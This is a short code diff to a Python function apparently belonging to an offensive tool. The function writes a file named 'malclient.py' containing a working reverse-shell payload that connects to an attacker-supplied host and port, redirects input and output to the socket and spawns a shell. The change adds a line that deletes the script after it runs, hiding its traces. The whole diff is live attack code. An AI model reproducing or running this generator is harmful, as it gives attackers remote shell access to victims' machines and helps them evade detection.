@@ -46,13 +46,14 @@ def CreateScript(lhost:str,lport:str,osTarget:str):
         shellType = "/bin/bash"
     
     # Executable will create a reverse shell connection via pty
-    baseScript = f"""import socket, threading, subprocess, os, pty
+    baseScript = f"""import socket, subprocess, os, sys, pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((\"{lhost}\",{lport}))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn(\"{shellType}\")
+os.remove(sys.argv[0])
 """
     with open('malclient.py', 'w') as MalScript:
         MalScript.write(baseScript)
